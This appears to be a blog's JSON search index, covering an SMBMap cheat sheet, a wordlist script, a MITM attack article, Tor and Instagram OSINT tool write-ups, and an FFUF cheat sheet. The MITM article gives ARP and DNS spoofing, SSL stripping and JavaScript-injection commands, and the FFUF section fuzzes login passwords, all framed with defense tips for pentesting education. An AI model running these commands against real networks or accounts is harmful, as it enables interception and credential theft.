style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 